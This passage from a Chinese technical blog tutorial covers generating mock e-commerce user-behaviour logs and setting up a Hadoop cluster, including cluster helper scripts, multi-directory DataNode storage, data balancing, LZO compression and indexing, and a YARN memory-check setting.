src="/2020/11/23/bigdata-datacollect1-userbehavior/1637657318225.png" alt="1637657318225"></p><p>因此不管是login shell还是non-login shell，启动时都会加载/etc/profile.d/*.sh中的环境变量。</p><h2 id="3-4-模拟数据"><a href="#3-4-模拟数据" class="headerlink" title="3.4 模拟数据"></a>3.4 模拟数据</h2><h3 id="3-4-1-使用说明"><a href="#3-4-1-使用说明" class="headerlink" title="3.4.1 使用说明"></a>3.4.1 使用说明</h3><p>1）将application.yml、gmall2020-mock-log-2021-01-22.jar、path.json、logback.xml上传到hadoop102的/opt/module/applog目录下</p><p>（1）创建applog路径</p><pre><code>[molly@hadoop102 module]$ mkdir /opt/module/applog</code></pre><p>（2）上传文件</p><p>2）配置文件</p><p>（1）application.yml文件</p><p>可以根据需求生成对应日期的用户行为日志。</p><pre><code>[molly@hadoop102 applog]$ vim application.yml</code></pre><p>修改如下内容</p><pre class="line-numbers language-yml"><code class="language-yml"># 外部配置打开# 外部配置打开logging.config: "./logback.xml"#业务日期mock.date: "2020-06-14"#模拟数据发送模式#mock.type: "http"#mock.type: "kafka"mock.type: "log"#http模式下，发送的地址mock.url: "http://hdp1/applog"#kafka模式下，发送的地址mock:  kafka-server: "hdp1:9092,hdp2:9092,hdp3:9092"  kafka-topic: "ODS_BASE_LOG"#启动次数mock.startup.count: 200#设备最大值mock.max.mid: 500000#会员最大值mock.max.uid: 100#商品最大值mock.max.sku-id: 35#页面平均访问时间mock.page.during-time-ms: 20000#错误概率 百分比mock.error.rate: 3#每条日志发送延迟 msmock.log.sleep: 10#商品详情来源  用户查询，商品推广，智能推荐, 促销活动mock.detail.source-type-rate: "40:25:15:20"#领取购物券概率mock.if_get_coupon_rate: 75#购物券最大idmock.max.coupon-id: 3#搜索关键词  mock.search.keyword: "图书,小米,iphone11,电视,口红,ps5,苹果手机,小米盒子"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）path.json，该文件用来配置访问路径</p><p>根据需求，可以灵活配置用户点击路径。</p><p>来到主页-搜索-上篇-下单-。。</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">[</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"good_list"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">,</span><span class="token string">"cart"</span><span class="token punctuation">,</span><span class="token string">"trade"</span><span class="token punctuation">,</span><span class="token string">"payment"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">20</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"search"</span><span class="token punctuation">,</span><span class="token string">"good_list"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">,</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">,</span><span class="token string">"cart"</span><span class="token punctuation">,</span><span class="token string">"trade"</span><span class="token punctuation">,</span><span class="token string">"payment"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">40</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"mine"</span><span class="token punctuation">,</span><span class="token string">"orders_unpaid"</span><span class="token punctuation">,</span><span class="token string">"trade"</span><span class="token punctuation">,</span><span class="token string">"payment"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">10</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"mine"</span><span class="token punctuation">,</span><span class="token string">"orders_unpaid"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">,</span><span class="token string">"good_spec"</span><span class="token punctuation">,</span><span class="token string">"comment"</span><span class="token punctuation">,</span><span class="token string">"trade"</span><span class="token punctuation">,</span><span class="token string">"payment"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">5</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"mine"</span><span class="token punctuation">,</span><span class="token string">"orders_unpaid"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">,</span><span class="token string">"good_spec"</span><span class="token punctuation">,</span><span class="token string">"comment"</span><span class="token punctuation">,</span><span class="token string">"home"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">5</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">10</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">10</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）logback配置文件</p><p>可配置日志生成路径，修改内容如下</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>LOG_HOME<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/opt/module/applog/log<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>console<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ch.qos.logback.core.ConsoleAppender<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">></span></span>%msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rollingFile<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.RollingFileAppender<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rollingPolicy</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.TimeBasedRollingPolicy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fileNamePattern</span><span class="token punctuation">></span></span>$<span class="token entity" title="&#123;">&amp;#123;</span>LOG_HOME<span class="token entity" title="&#125;">&amp;#125;</span>/app.%d<span class="token entity" title="&#123;">&amp;#123;</span>yyyy-MM-dd<span class="token entity" title="&#125;">&amp;#125;</span>.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fileNamePattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rollingPolicy</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">></span></span>%msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 将某一个包下日志单独打印日志 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>logger</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atgugu.gmall2020.mock.log.util.LogUtil<span class="token punctuation">"</span></span>            <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>INFO<span class="token punctuation">"</span></span> <span class="token attr-name">additivity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rollingFile<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>console<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>logger</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span>  <span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>console<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）生成日志</p><p>（1）进入到/opt/module/applog路径，执行以下命令</p><pre><code>[molly@hadoop102 applog]$ java -jar gmall2020-mock-log-2021-01-22.jar</code></pre><p>（2）在/opt/module/applog/log目录下查看生成日志</p><pre><code>[molly@hadoop102 log]$ ll</code></pre><h3 id="3-4-2-集群日志生成脚本"><a href="#3-4-2-集群日志生成脚本" class="headerlink" title="3.4.2 集群日志生成脚本"></a>3.4.2 集群日志生成脚本</h3><p>在生成日志的时候模拟多台服务器生产的日志。在hadoop102的/home/molly目录下创建bin目录，这样脚本可以在服务器的任何目录执行。</p><pre><code>[molly@hadoop102 ~]$ echo $PATH/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/molly/.local/bin:/home/molly/bin</code></pre><p>​    1）在/home/molly/bin目录下创建脚本lg.sh</p><pre><code>[molly@hadoop102 bin]$ vim lg.sh</code></pre><p>​    2）在脚本中编写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bashfor i in hadoop102 hadoop103; do    echo "========== $i =========="    ssh $i "cd /opt/module/applog/; java -jar gmall2020-mock-log-2021-01-22.jar >/dev/null 2>&1 &"done <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：</p><p>（1）/opt/module/applog/为jar包及配置文件所在路径</p><p>（2）/dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。</p><p>标准输入0：从键盘获得输入 /proc/self/fd/0 </p><p>标准输出1：输出到屏幕（即控制台） /proc/self/fd/1 </p><p>错误输出2：输出到屏幕（即控制台） /proc/self/fd/2</p><p>3）修改脚本执行权限</p><pre><code>[molly@hadoop102 bin]$ chmod u+x lg.sh</code></pre><p>4）将jar包及配置文件s上传至hadoop103的/opt/module/applog/路径</p><p>5）启动脚本</p><pre><code>[molly@hadoop102 module]$ lg.sh </code></pre><p>6）分别在hadoop102、hadoop103的/opt/module/applog/log目录上查看生成的数据</p><pre><code>[molly@hadoop102 logs]$ lsapp.2020-06-14.log[molly@hadoop103 logs]$ lsapp.2020-06-14.log</code></pre><h1 id="4-数据采集模块"><a href="#4-数据采集模块" class="headerlink" title="4 数据采集模块"></a>4 数据采集模块</h1><h2 id="4-1-集群所有进程查看脚本"><a href="#4-1-集群所有进程查看脚本" class="headerlink" title="4.1 集群所有进程查看脚本"></a>4.1 集群所有进程查看脚本</h2><p>1）在/home/molly/bin目录下创建脚本xcall.sh</p><pre><code>[molly@hadoop102 bin]$ vim xcall.sh</code></pre><p> 2）在脚本中编写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#! /bin/bashfor i in hadoop102 hadoop103 hadoop104do    echo --------- $i ----------    ssh $i "$*"done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）修改脚本执行权限</p><pre><code>[molly@hadoop102 bin]$ chmod 777 xcall.sh</code></pre><p>4）启动脚本</p><pre><code>[molly@hadoop102 bin]$ xcall.sh jps</code></pre><h2 id="4-2-Hadoop安装"><a href="#4-2-Hadoop安装" class="headerlink" title="4.2 Hadoop安装"></a>4.2 Hadoop安装</h2><p>详见：<a href="https://m01ly.github.io/2020/11/12/bigdata-hdfs1/">Hadoop 教程（二）安装hadoop集群-完全分布式部署</a>                  </p><p>1）集群规划：</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>HDFS</td><td>NameNode  DataNode</td><td>DataNode</td><td>DataNode  SecondaryNameNode</td></tr><tr><td>Yarn</td><td>NodeManager</td><td>Resourcemanager  NodeManager</td><td>NodeManager</td></tr></tbody></table><p>注意：尽量使用离线方式安装。第一次启动需要格式化namenode.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>hdfs namenode -format<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-1-项目经验之HDFS存储多目录"><a href="#4-2-1-项目经验之HDFS存储多目录" class="headerlink" title="4.2.1 项目经验之HDFS存储多目录"></a>4.2.1 项目经验之HDFS存储多目录</h3><p>datanode和namenode都可以多目录存储。namenode不同目录的数据都是一样的，所以这里我们不配namenode的多目录。但是datanode的多目录中每个目录存储的数据是不一样的，可以多目录（磁盘挂载到的对应目录。因此用不同磁盘来存储Datanode，实现方式就是：datanode配置多目录）</p><p>1）生产环境服务器磁盘情况</p><p>从当前服务器可以看到：4个磁盘挂载在不同的目录。</p><p>  <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637661734977.png" alt="1637661734977"></p><p>2）在hdfs-site.xml文件中配置多目录，注意新挂载磁盘的访问权限问题。</p><p>HDFS的DataNode节点保存数据的路径由dfs.datanode.data.dir参数决定，其默认值为file://${hadoop.tmp.dir}/dfs/data，若服务器有多个磁盘，必须对该参数进行修改。如服务器磁盘如上图所示，则该参数应修改为如下的值。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.datanode.data.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>file:///dfs/data1,file:///hd2/dfs/data2,file:///hd3/dfs/data3,file:///hd4/dfs/data4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>注意：每台服务器挂载的磁盘不一样，所以每个节点的多目录配置可以不一致。单独配置即可。</p><h3 id="4-2-2-集群数据均衡"><a href="#4-2-2-集群数据均衡" class="headerlink" title="4.2.2 集群数据均衡"></a>4.2.2 集群数据均衡</h3><p><strong>1）节点间数据均衡</strong>:就是102 103 104之间的</p><p>下面由于人工操作会导致三台节点的存储数据不均衡，如下图所示：<img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637662122810.png" alt="1637662122810"></p><p>解决办法：开启数据均衡命令：</p><pre class="line-numbers language-bash"><code class="language-bash">start-balancer.sh -threshold 10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于参数10，代表的是集群中各个节点的磁盘空间利用率相差不超过10%，可根据实际情况进行调整。</p><p>停止数据均衡命令：</p><pre class="line-numbers language-bash"><code class="language-bash">stop-balancer.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2）磁盘间数据均衡</strong></p><p>hadoop3.x的新特性：针对磁盘间的数据均衡</p><p>（1）生成均衡计划（我们只有一块磁盘，不会生成计划）</p><pre class="line-numbers language-bash"><code class="language-bash">hdfs diskbalancer -plan hadoop103<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）执行均衡计划</p><pre class="line-numbers language-bash"><code class="language-bash">hdfs diskbalancer -execute hadoop103.plan.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）查看当前均衡任务的执行情况</p><pre class="line-numbers language-bash"><code class="language-bash">hdfs diskbalancer -query hadoop103<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）取消均衡任务</p><pre class="line-numbers language-bash"><code class="language-bash">hdfs diskbalancer -cancel hadoop103.plan.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-3-项目经验之支持LZO压缩配置"><a href="#4-2-3-项目经验之支持LZO压缩配置" class="headerlink" title="4.2.3 项目经验之支持LZO压缩配置"></a>4.2.3 项目经验之支持LZO压缩配置</h3><p>1）hadoop本身并不支持lzo压缩，故需要使用twitter提供的<a href="https://github.com/twitter/hadoop-lzo">hadoop-lzo</a>开源组件。hadoop-lzo需依赖hadoop和lzo进行编译。</p><p>2）将编译好后的hadoop-lzo-0.4.20.jar 放入hadoop-3.1.3/share/hadoop/common/</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 common<span class="token punctuation">]</span>$ <span class="token function">pwd</span>/opt/module/hadoop-3.1.3/share/hadoop/common<span class="token punctuation">[</span>molly@hadoop102 common<span class="token punctuation">]</span>$ <span class="token function">ls</span>hadoop-lzo-0.4.20.jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>3）同步hadoop-lzo-0.4.20.jar到hadoop103、hadoop104</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 common<span class="token punctuation">]</span>$ xsync hadoop-lzo-0.4.20.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）core-site.xml增加配置支持LZO压缩</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>io.compression.codecs<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>​      org.apache.hadoop.io.compress.GzipCodec,​      org.apache.hadoop.io.compress.DefaultCodec,​      org.apache.hadoop.io.compress.BZip2Codec,​      org.apache.hadoop.io.compress.SnappyCodec,​      com.hadoop.compression.lzo.LzoCodec,​      com.hadoop.compression.lzo.LzopCodec​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>io.compression.codec.lzo.class<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>com.hadoop.compression.lzo.LzoCodec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）同步core-site.xml到hadoop103、hadoop104</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop<span class="token punctuation">]</span>$ xsync core-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6）启动及查看集群</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ sbin/start-dfs.sh<span class="token punctuation">[</span>molly@hadoop103 hadoop-3.1.3<span class="token punctuation">]</span>$ sbin/start-yarn.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-2-4-测试LZO"><a href="#4-2-4-测试LZO" class="headerlink" title="4.2.4 测试LZO"></a>4.2.4 测试LZO</h3><p>（1）执行wordcount程序</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount -Dmapreduce.job.inputformat.class<span class="token operator">=</span>com.hadoop.mapreduce.LzoTextInputFormat /input /lzo-output<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637662603236.png" alt="1637662603236"></p><h3 id="4-2-4-项目经验之LZO创建索引"><a href="#4-2-4-项目经验之LZO创建索引" class="headerlink" title="4.2.4 项目经验之LZO创建索引"></a>4.2.4 项目经验之LZO创建索引</h3><p>1）创建LZO文件的索引，LZO压缩文件的可切片特性依赖于其索引，故我们需要手动为LZO压缩文件创建索引。若无索引，则LZO文件的切片只有一个。</p><pre class="line-numbers language-bash"><code class="language-bash">hadoop jar /path/to/your/hadoop-lzo.jar com.hadoop.compression.lzo.DistributedLzoIndexer big_file.lzo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）测试</p><p>​    （1）将bigtable.lzo（200M）上传到集群的根目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ hadoop fs -mkdir /input<span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ hadoop fs -put bigtable.lzo /input<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637662802344.png" alt="1637662802344"></p><p>（2）执行wordcount程序</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount -Dmapreduce.job.inputformat.class<span class="token operator">=</span>com.hadoop.mapreduce.LzoTextInputFormat /input /output1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 允许发现切片只有一个，因此想起原理，Lzo切片是依赖于索引的，因此我们需要建索引</p><p>（3）对上传的LZO文件建索引</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/common/hadoop-lzo-0.4.20.jar com.hadoop.compression.lzo.DistributedLzoIndexer /input/bigtable.lzo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>   <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637662962636.png" alt="1637662962636"></p><p>（4）再次执行WordCount程序</p><p>这里注意需要指定inputformat类为LzoText对应的类com.hadoop.mapreduce.LzoTextInputFormat</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount -Dmapreduce.job.inputformat.class<span class="token operator">=</span>com.hadoop.mapreduce.LzoTextInputFormat /input /output2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 发现切片数为2。查看历史服务器去查看具体切片信息。<img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637662988690.png" alt="1637662988690"></p><p>  map执行过程中切片信息。<img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637663231181.png" alt="1637663231181"></p><p>3）注意：如果以上任务，在运行过程中报如下异常</p><pre class="line-numbers language-bash"><code class="language-bash">Container <span class="token punctuation">[</span>pid<span class="token operator">=</span>8468,containerID<span class="token operator">=</span>container_1594198338753_0001_01_000002<span class="token punctuation">]</span> is running 318740992B beyond the <span class="token string">'VIRTUAL'</span> memory limit. Current usage: 111.5 MB of 1 GB physical memory used<span class="token punctuation">;</span> 2.4 GB of 2.1 GB virtual memory used. Killing container.Dump of the process-tree <span class="token keyword">for</span> container_1594198338753_0001_01_000002 <span class="token keyword">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解决办法：在hadoop102的/opt/module/hadoop-3.1.3/etc/hadoop/yarn-site.xml文件中增加如下配置，然后分发到hadoop103、hadoop104服务器上，并重新启动集群。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--是否启动一个线程检查每个任务正使用的物理内存量，如果任务超出分配值，则直接将其杀掉，默认是true --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.pmem-check-enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--是否启动一个线程检查每个任务正使用的虚拟内存量，如果任务超出分配值，则直接将其杀掉，默认是true --></span><span class="token 